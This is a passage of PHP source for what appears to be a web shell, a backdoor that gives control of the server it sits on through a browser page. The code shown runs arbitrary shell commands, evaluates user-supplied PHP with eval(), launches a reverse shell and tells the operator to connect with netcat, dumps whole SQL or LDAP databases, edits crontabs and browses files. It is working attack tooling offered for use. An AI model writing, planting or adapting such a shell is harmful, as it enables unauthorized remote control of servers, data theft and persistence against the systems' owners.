            <input ".(($a == 'ADD') ? 'CHECKED' : '')." type=radio
                   id=ldap_rw_action_add 
                   name=ldap_rw_action value='ADD'>
                   <label for=ldap_rw_action_add>Add</label>
            <input ".(($a == 'MODIFY') ? 'CHECKED' : '')." type=radio
                   id=ldap_rw_action_modify 
                   name=ldap_rw_action value='MODIFY'>
                   <label for=ldap_rw_action_modify>Modify</label>
            <input ".(($a == 'DELETE') ? 'CHECKED' : '')." type=radio 
                   id=ldap_rw_action_delete
                   name=ldap_rw_action value='DELETE'>
                   <label for=ldap_rw_action_delete>Delete</label>
            </div>",
            $prs->htmlentities ($prs->vars['ldap_query']),
            $prs->htmlentities (implode (',', $prs->vars['sql_info_2'])));
        }
        else
        {
          echo "
            <input type=hidden name=ldap_query>
            <input type=hidden name=sql_info_2>";
        }

        echo "<p><input type=button onclick=\"
          action_requested.value='".SHELL_SQL_EXECUTE."';
          _submit()\" value='Execute'> <input type=button value='Reset'
          onclick=\"sql_command.value='';ldap_query.value='';sql_info_2.value=''\">";

        if ($prs->vars['sql_type'] != SQL_LDAP)
        {
          echo "
            <p><input type=button value='Show tables' onclick=\"sql_command.value='show tables';action_requested.value='" . SHELL_SQL_EXECUTE . "';_submit()\">
            <input type=button value='Show databases' onclick=\"sql_command.value='show databases';action_requested.value='" . SHELL_SQL_EXECUTE . "';_submit()\">";
        }

        echo "
            <input id=ldap_section_4 type=button value='Dump' title='Dump the whole database' onclick=\"sql_current_table.value='';action_requested.value='" . SHELL_SQL_DUMP . "';_submit()\">";

        if ($prs->vars['sql_type'] == SQL_LDAP)
        {
          echo $prs->get_ldap_end_js();
        }

        echo "</div><div>";
        if ($prs->sql_history_exists ())
        {
          $prs->display_sql_history_html ();
        }
        echo "</div>";

        if (!$prs->vars['sql_error'] && 
             $prs->vars['sql_command_current'] != '' &&
             is_array ($prs->vars['sql_command_current_output']) &&
             count ($prs->vars['sql_command_current_output'])) 
        {
          $prs->display_sql_result_html ();
        }
      }

      echo "</div>";

      break;

    case SHELL_EXECUTE_REVERSE:

      $prs->check_auth ();
      
      $ip = $prs->vars['rs_ip'];
      $port = $prs->vars['rs_port'];
  
      echo "
        <div id='rs_infos'>
        <h1>Do not close this page&nbsp;!</h1>
        <b>Listening on $ip:$port</b>
        <p>Use netcat or any other client on your local machine to execute bash commands on the remote host.</p>
        <p>For example: <code>nc $ip $port</code></p>
        <p><i>It's just a <b>basic shell</b>, which means that sometimes it will not work and that the connection may be cut or looped at any time. Some commands will be rewritten (like <code>ping</code> or <code>top</code>), others will be emulated (like <code>clear</code>). It is likely that in dying (when you grab the <code>shutdown</code> command from your client) it causes a zombie process.</i></p>
        </div>";
  
      ob_flush ();
      flush ();
  
      $prs->vars['command_current'] =
        "php ".$_SERVER['SCRIPT_FILENAME']." $ip $port ".$prs->vars['cryptkey'];
      $prs->command_current_execute ();
  
      $out = preg_replace ("/(\"|\r|\n)/", ' ',
                           $prs->vars['command_current_output']);

      if (preg_match ('/[a-z]/i', $out))
      {
        $out = (stripos ($out, 'success') !== false) ?
          "Reverse shell badly terminated with CTRL+C. Next time, ".
          "use <b>shutdown</b> command!"
          :
          "<p><b>Error launching reverse shell</b> : $out</p>".
          "<p>Try another IP or port.</p>";
      }
      else
      {
        $out = "Reverse shell terminated by client request.";
      }

      echo "<script>document.getElementById('rs_infos').innerHTML = \"$out\";</script>";

      exit (0);

      break;

    // NOTEBOOK: Shell code
    case SHELL_TYPE_SHELL:

      $display = 1;
      if (ini_get ('safe_mode'))
      {
        echo "<p>".$prs->get_safe_mode_alert_html (
            ($d = ini_get ('safe_mode_exec_dir')) ? 'some' : 'all');
        $display = ($d);
      }
      elseif (!$prs->execute_enabled ())
      {
        echo "<p>".$prs->get_php_function_alert_html();
        $display = 0;
      }

      if ($display)
      {
        echo "<div style='margin:auto;width:410px'>";

        if ($prs->php_function_enabled ('socket_create'))
        {
          $prs->display_reverse_shell_html ();
        }

        printf ("
          <p/>Enter a new shell command to execute (<span style='color:gray'>only use one shot commands. <i>ping</i>, <i>traceroute</i> and alike will not work</span>)&nbsp;:
          <p>%s<p>
          <p><input type=text style=\"width:400px\" name=command value=\"%s\">",
          $prs->get_htmloutput_html (),
          $prs->htmlentities ($prs->vars['command_current'])
        );

        // Commands History table
        if ($prs->history_exists ())
        {
          $prs->display_history_html();
        }

        echo "
          <p><input type=button onclick=\"
          action_requested.value='".SHELL_EXECUTE."';
          _submit()\" value='Execute'>
          <input type=button value='Reset' onclick=\"command.value=''\"></div>";

        if ($prs->vars['command_current'] != '') 
        {
          echo '<div style="margin:auto;width:800px">';
          if ($prs->is_htmloutput ())
          {
            echo $prs->vars['command_current_output'];
          }
          else
          {
            echo "<textarea class=ffixe>".
                  $prs->htmlentities ($prs->vars['command_current_output']).
                 "</textarea>";
          }
          echo '</div>';
        }
      }

      break;
      
    // MENU PHP code
    case SHELL_TYPE_PHP_CODE:

      printf ("
        <div style='margin:auto;width:800px'>
        <p>%s<p>New PHP code to execute&nbsp;:
        <p><input type=button onclick=\"_submit()\" value='Execute'><p>
        <textarea class=ffixe name=phpcode_current>%s</textarea><p>
        <input type=button onclick=\"_submit()\" 
        value='Execute'></div>",
        $prs->get_htmloutput_html (),
        $prs->htmlentities ($prs->vars['phpcode_current'])
      );

      if ($prs->vars['phpcode_current'] != '')
      {
        $err = 0;
        ob_start ();
        if (eval ($prs->vars['phpcode_current'] . ';') === false)
        {
          $output = "A error occured while executing custom PHP code";
          $err = 1;
        }
        else
        {
          $output = ob_get_contents();
        }
        ob_end_clean ();

        if ($err)
        {
          echo "<script type=\"text/javascript\">
                var c = document.getElementById('error_console');
                c.innerHTML = \"* $output\\n\" + 
                c.innerHTML;c.style.display='block';</script>";
        }

        echo "<div id=phpcode_output_title>PHP Result&nbsp;:</div>";

        echo '<div style="margin:auto;width:800px">';
        if ($prs->is_htmloutput ())
        {
          echo $output;
        }
        else
        {
          echo "<textarea class=ffixe>".
                $prs->htmlentities ($output).
               "</textarea>";
        }
        echo "</div>";
      }

      break;
      
    // MENU Crontab
    case SHELL_TYPE_CRONTAB:
    
      echo '<div style="margin:auto;width:800px">';

      if ($prs->crontab_enabled ())
      {
        $prs->display_crontab_html ();
      }
      else
      {
        echo 
          "<p style='color:gray;text-align:center'>Crontab is <b>not available</b> for the current Web user <b>".$prs->vars['www_user']."</b>.</p>";
      }

      echo "</div>";

      break;

    // NOTEBOOK Zombies
    case SHELL_TYPE_ZOMBIES:

      echo '<div style="margin:auto;width:800px">';
?>
<script language="javascript">
  ajax = new_ajax ();
  ajax_timer = new_ajax ();
  function new_ajax ()
  {
    var a = null;
    try {a = new ActiveXObject ("Microsoft.XMLHTTP")} 
      catch (e) {a = new XMLHttpRequest ()}
    return a;
  }
  function ajax_request (a, params, id)
  {
    if (a.readyState != 0)
      a.abort ();
    a.onreadystatechange = function () {
      if (id && a.readyState == 4 && a.status == 200)
        document.getElementById(id).innerHTML = a.responseText;
    };
    a.open("POST", "<?php echo $_SERVER['REQUEST_URI']?>", true);
    a.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
    a.send (params + '&div=' + id);
  }
  function show_msg(m) 
  {
    var msg = document.getElementById('msg');
    var msg_text = document.getElementById('msg_text');
    msg_text.innerHTML = m;
    msg.style.display='block';
  }
  function close_msg() 
  {
    var m = document.getElementById('msg');
    if (m)
      document.getElementById('msg').style.display='none';
  }
</script>
<?php
      echo "<div id=zombies>";
      if ($prs->vars['action_type'] == ACTION_MENU_ZOMBIE_EDIT)
      {
        echo $prs->vars['action_result'];
      }
      else
      {
        echo $prs->get_zombies_list_html();
      }
      echo "</div>";
      
      if ($prs->vars['action_type'] == ACTION_MENU_ZOMBIE_EDIT)
      {
?>
<script language="javascript">
  function ajax_refresh (a, id)
  {
    ajax_request (
      a, "ajax=z&id=<?php echo urlencode ($prs->vars['zombie_id'])?>", id);
  }
<?php
  if ($prs->vars['page_menu_display'])
  {
    echo "show_hide_page_menu ('".$prs->vars['page_menu_display']."');";
  }
?>
  window.setInterval ("ajax_refresh(ajax_timer,'id_timer');", 
    <?php echo AJAX_REFRESH_INTERVAL?>);
</script>
<?php
      }
      else
      {
?>
<script language="javascript">
  function ajax_refresh (a, id)
  {
    ajax_request (a, 'ajax=z', id);
  }
  window.setInterval ("ajax_refresh(ajax,'zombies');", 
    <?php echo AJAX_REFRESH_INTERVAL?>);
</script>
<?php
      }

      echo "</div>";

      break;

    // File browser
    case SHELL_TYPE_FILE_BROWSER:
    default:

      $prs->vars['display_type'] = SHELL_TYPE_FILE_BROWSER;

      if (!$prs->execute_enabled () &&
          !$prs->browse_enabled ())
      {
        if (ini_get ('safe_mode'))
        {
          echo "<p>".$prs->get_safe_mode_alert_html('all');
        }
        else
        {
          echo "<p>".$prs->get_php_function_alert_html();
        }
      }
      else
      {
        $prs->get_browse_dir ();
      }

      break;
  }

  if ($prs->vars['display_type'] != SHELL_TYPE_FILE_BROWSER)
  {
    foreach (array (
      'show_files' => $prs->vars['show_files'],
      'show_hidden_files' => $prs->vars['show_hidden_files'],
      'show_symlinks' => $prs->vars['show_symlinks'],
      'show_directories' => $prs->vars['show_directories']
    ) as $n => $v)
    {
      echo $prs->get_input_hidden_html($n, $v);
    }
  }

  foreach (array (
    'cryptkey' => $prs->vars['cryptkey'],
    'show_hide_aliases' => $prs->get_show_hide ('aliases'),
    'show_hide_profiles' => $prs->get_show_hide ('profiles'),
    'show_hide_'.SQL_POSTGRESQL.'s' => $prs->get_show_hide (SQL_POSTGRESQL.'s'),
    'show_hide_'.SQL_MYSQL.'s' => $prs->get_show_hide (SQL_MYSQL.'s'),
    'show_hide_'.SQL_LDAP.'s' => $prs->get_show_hide (SQL_LDAP.'s'),
    'show_hide_envpath' => $prs->get_show_hide ('envpath'),
    'show_hide_bookmarks' => $prs->get_show_hide ('bookmarks'),
    'show_hide_initpath' => $prs->get_show_hide ('initpath'),
    'show_hide_highlight' => $prs->get_show_hide ('highlight'),
    'is_nav' => 0,
    'page_menu_display' => '',
    'force_view' => $prs->vars['force_view'],
    'force_save' => $prs->vars['force_save'],
    'force_delete' => $prs->vars['force_delete'],
    'action_type' => $prs->vars['action_type'],
    'display_type' => $prs->vars['display_type'],
    'history_index' => 0,
    'sql_history_index' => 0,
    'profiles_index' => 0,
    SQL_POSTGRESQL.'s_index' => 0,
    SQL_MYSQL.'s_index' => 0,
    SQL_LDAP.'s_index' => 0,
    'envpath_index' => 0,
    'zombie_id' => $prs->vars['zombie_id'],
    'bookmarks_index' => 0,
    'dir_current' => $prs->vars['dir_current'],
    'profile_current' => $prs->vars['profile_current'],
    'sql_current' => $prs->vars['sql_current'],
    'sql_current_table' => '',
    'sql_type' => $prs->vars['sql_type'],
    'use_opendir' => $prs->vars['use_opendir'],
    'use_glob' => $prs->vars['use_glob'],
    'file_current_rights' => $prs->vars['file_current_rights'],
    'file_browser_initpath' => $prs->vars['file_browser_initpath'],
    'action_requested' => '',
    'history' => $prs->form_get_serialize ('history'),
    'sql_history' => $prs->form_get_serialize ('sql_history'),
    'aliases' => $prs->form_get_serialize ('aliases'),
    'profiles' => $prs->form_get_serialize ('profiles'),
    SQL_POSTGRESQL.'s' => $prs->form_get_serialize (SQL_POSTGRESQL.'s'),
    SQL_MYSQL.'s' => $prs->form_get_serialize (SQL_MYSQL.'s'),
    SQL_LDAP.'s' => $prs->form_get_serialize (SQL_LDAP.'s'),
    'envpath' => $prs->form_get_serialize ('envpath'),
    'envpath_box_x' => $prs->get_box_posX ('envpath'),
    'envpath_box_y' => $prs->get_box_posY ('envpath'),
    'bookmarks' => $prs->form_get_serialize ('bookmarks'),
    'bookmarks_box_x' => $prs->get_box_posX ('bookmarks'),
    'bookmarks_box_y' => $prs->get_box_posY ('bookmarks'),
    'initpath_box_x' => $prs->get_box_posX ('initpath'),
    'initpath_box_y' => $prs->get_box_posY ('initpath'),
    'highlight_box_x' => $prs->get_box_posX ('highlight'),
    'highlight_box_y' => $prs->get_box_posY ('highlight'),
    'aliases_box_x' => $prs->get_box_posX ('aliases'),
    'aliases_box_y' => $prs->get_box_posY ('aliases'),
    'profiles_box_x' => $prs->get_box_posX ('profiles'),
    'profiles_box_y' => $prs->get_box_posY ('profiles'),
    SQL_POSTGRESQL.'s_box_x' => $prs->get_box_posX (SQL_POSTGRESQL.'s'),
    SQL_POSTGRESQL.'s_box_y' => $prs->get_box_posY (SQL_POSTGRESQL.'s'),
    SQL_MYSQL.'s_box_x' => $prs->get_box_posX (SQL_MYSQL.'s'),
    SQL_MYSQL.'s_box_y' => $prs->get_box_posY (SQL_MYSQL.'s'),
    SQL_LDAP.'s_box_x' => $prs->get_box_posX (SQL_LDAP.'s'),
    SQL_LDAP.'s_box_y' => $prs->get_box_posY (SQL_LDAP.'s') 
  ) as $n => $v)
  {
    echo $prs->get_input_hidden_html($n, $v);
  }
?>
</form>

</body>
</html>
<?php  
/* PRSDATA

*/
?>
<?php } ?>
